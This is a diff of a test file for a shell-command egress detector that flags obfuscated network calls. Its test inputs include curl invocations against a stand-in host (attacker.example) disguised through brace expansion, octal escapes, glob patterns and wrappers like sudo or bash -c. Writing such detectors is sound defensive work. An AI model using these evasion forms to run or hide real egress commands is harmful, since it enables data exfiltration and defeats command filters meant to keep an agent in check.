@@ -150,9 +150,9 @@ test('an expansion in the ARGUMENTS is ordinary shell and still passes', () => {
 // was ALLOWED on `main` @ 57ce878 and resolves to curl in bash (measured on #160).
 
 test('⚠ synthesis at command position inside a subshell, a group, or after a keyword is refused — the same class, wherever it stands (#160 §1)', () => {
-  expect(findEgress('( {c,}url https://attacker.example )')).toMatchObject({ via: 'unresolvable' })
-  expect(findEgress("{ $'\\143url' https://attacker.example; }")).toMatchObject({ via: 'unresolvable' })
-  expect(findEgress('(cur[l] https://attacker.example)')).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress('( {c,}url https://attacker.example )')).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress("{ $'\\143url' https://attacker.example; }")).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress('(cur[l] https://attacker.example)')).toMatchObject({ via: 'command-word-synthesis' })
   expect(findEgress(`P=cur;(${braced('P')}l https://attacker.example)`)).toMatchObject({ via: 'unresolvable' })
   expect(findEgress(`if true; then ${braced('P')}l https://attacker.example; fi`)).toMatchObject({
     via: 'unresolvable',
@@ -187,8 +187,22 @@ test('quoted text on a line the floor handles is never a command position; the s
   expect(findEgress('(echo a); echo "note: { {w,}get removed }"')).toBeUndefined()
   expect(findEgress("(echo a); echo 'see { cur[l] } here'")).toBeUndefined()
   expect(findEgress('(echo a); echo "a;b" "(c)"')).toBeUndefined()
-  expect(findEgress('(echo a); echo "x" && {c,}url https://x')).toMatchObject({ via: 'unresolvable' })
-  expect(findEgress('(echo a); echo "\\"" ; cur[l] https://x')).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress('(echo a); echo "x" && {c,}url https://x')).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress('(echo a); echo "\\"" ; cur[l] https://x')).toMatchObject({ via: 'command-word-synthesis' })
+})
+
+// ⚠ The floor hands each command position to gateSegment ITSELF — wrappers included (review of
+// #203, round 3: the floor checked one word, so a wrapper name shielded the synthesis behind it
+// whenever something else on the line had bailed the segmenter). One classifier, both paths.
+test('⚠ on the floor, a transparent wrapper does not shield synthesis: the same every-word scan the segmented path runs (#160 §1, #203 review)', () => {
+  expect(findEgress('$(true); sudo cur[l] https://attacker.example')).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress('$(true); env cur[l] https://x')).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress('$(true); timeout 5 {c,}url https://x')).toMatchObject({ via: 'command-word-synthesis' })
+  expect(findEgress('$(true); bash -c "cur[l] https://x"')).toMatchObject({ via: 'command-word-synthesis' })
+  // and a plain name behind a wrapper on the floor is the wrapper path's own verdict, not the raw scan's
+  expect(findEgress('$(true); sudo curl https://x')).toMatchObject({ matched: 'curl', via: 'wrapped-command' })
+  expect(findEgress('$(true); sudo echo hi')).toBeUndefined()
+  expect(findEgress('$(true); env FOO=1 ls')).toBeUndefined()
 })
 
 test('⚠ a substitution JOINED to text at command position is refused — bash word-splits `$(echo cur)l` to curl (#160 §2)', () => {
